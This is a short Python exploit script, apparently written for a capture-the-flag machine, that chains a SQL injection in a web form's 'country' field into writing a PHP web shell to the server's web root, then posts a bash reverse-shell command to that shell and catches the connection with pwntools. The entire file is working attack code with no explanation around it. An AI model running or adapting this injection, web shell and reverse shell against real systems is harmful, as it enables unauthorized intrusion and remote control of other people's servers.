import requests
from pwn import *


target = 'http://10.10.11.116'
target2 = 'http://10.10.11.116/evil.php'
ip = '10.10.14.17' # cambiar esto
session = requests.session()

def sqli():

    payload=  """Brazil' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/evil.php"-- -"""
    
    post_data =  {
        'username':'test',
        'country':payload
    
    }

    session.post(target,data=post_data)


def reverse():

    payload ="bash -c 'bash -i >& /dev/tcp/%s/1234 0>&1'" %ip

    post_data={

        'cmd':payload

    }

    session.post(target2,data=post_data)

if __name__ == '__main__':
    sqli()
    threading.Thread(target=reverse, args=()).start()
    shell = listen(1234,timeout=10).wait_for_connection()
    shell.interactive()
